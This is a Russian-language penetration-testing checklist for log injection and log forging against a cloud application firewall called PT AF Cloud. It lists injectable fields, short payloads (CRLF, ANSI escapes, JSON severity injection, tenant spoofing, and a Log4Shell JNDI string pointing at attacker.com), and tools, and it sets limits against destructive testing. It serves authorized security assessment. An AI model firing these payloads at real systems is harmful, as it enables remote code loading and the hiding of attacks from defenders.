# Log Injection / Forging — PT AF Cloud

## Что ищем
Log injection / log forging, из-за которых:
- атака скрывается
- меняется severity
- событие связывается с другим клиентом / доменом

## Где искать
- Поля, попадающие в логи: User-Agent, Referer, X-Forwarded-For, URL, тело запроса
- Названия правил / политик / tenant (если логируются)
- Комментарии к инцидентам (если пишутся в лог)
- Импортированные правила (описание уходит в лог)
- Webhook / уведомления (payload уходит в лог)
- Debug endpoints (см. 13-secrets-leaks)

## Векторы
- **CRLF injection:** `%0d%0a` → поддельная строка лога
- **ANSI escape:** `\x1b[2J` → очистка экрана, скрытие
- **JSON injection:** `{"severity":"low"}` в поле, которое логируется как JSON
- **Формат-строки:** `%s`, `%n` (если логгер на C)
- **Unicode-гомоглифы:** `а` (кириллица) vs `a` (латиница) в tenant/domain
- **Подмена tenant/domain в логе:** через `\n` + `tenant=other-tenant`
- **Log4Shell / JNDI:** `jndi:ldap://attacker.com/a` в User-Agent (если логгер уязвим)

## Сценарии (что важно PT)
- **Скрытие атаки:** XSS/SQLi в User-Agent → в логе выглядит как обычный запрос
- **Смена severity:** инъекция `severity=low` в поле события
- **Привязка к чужому клиенту:** `\n tenant=other-tenant` в поле
- **Обход детекта:** payload, который AF не логирует, но пропускает

## Инструменты
- Burp (ручной CRLF в заголовках)
- log4j-scan (если подозрение на Log4j)
- interactsh (OOB для JNDI)

## Чек-лист
- [ ] Найти поля, попадающие в логи (UA, Referer, XFF, URL, body)
- [ ] Подставить `%0d%0a` + поддельную строку
- [ ] Подставить ANSI escape
- [ ] Подставить JSON-инъекцию в поле
- [ ] Проверить JNDI в UA / XFF (Log4Shell)
- [ ] Проверить Unicode-гомоглифы в tenant/domain
- [ ] Проверить, скрывается ли атака в логе
- [ ] Проверить смену severity / привязку к чужому tenant

## Не делать
- Не забивать логи массово (это DoS)
- Не выполнять destructive JNDI-payload'ы
- В PoC — 1 событие, не массив
